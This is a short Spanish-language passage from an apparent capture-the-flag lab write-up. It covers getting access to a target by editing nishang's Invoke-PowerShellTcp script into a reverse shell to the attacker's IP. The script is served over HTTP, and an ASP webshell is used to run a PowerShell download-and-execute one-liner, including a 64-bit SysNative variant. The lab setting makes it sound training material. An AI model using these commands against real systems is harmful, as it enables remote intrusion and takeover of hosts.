## Vuln exploit & Gaining Access {-}

### Conneccion con una shell typo powershell de nishang {-}

```bash
git clone https://github.com/samratashok/nishang
cd nishang
ls
cd Shells
ls
cp Invoke-PowerShellTcp.ps1 PS.ps1
vi PS.ps1
```

Como siempre le añadimos `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 443` al final del fichero.

Nos compartimos un servidor http con python

```bash
python -m http.server 80
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Y por la webshell nos descargamos el fichero PS.ps1 `http://10.10.10.116/upload/s4vishell.asp?cmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PS.ps1')`

Ya podemos comprobar que estamos a dentro de la maquina y que podemos ver la flag.

> Note: Si le hacemos un `[Environment]::Is64BitOperatingSystem` y un `[Environment]::Is64BitProcess`, podemos ver que el process nos da False. Aqui es recommendado siempre tirar
de la powershell nativa que seria  `http://10.10.10.116/upload/s4vishell.asp?cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PS.ps1')`
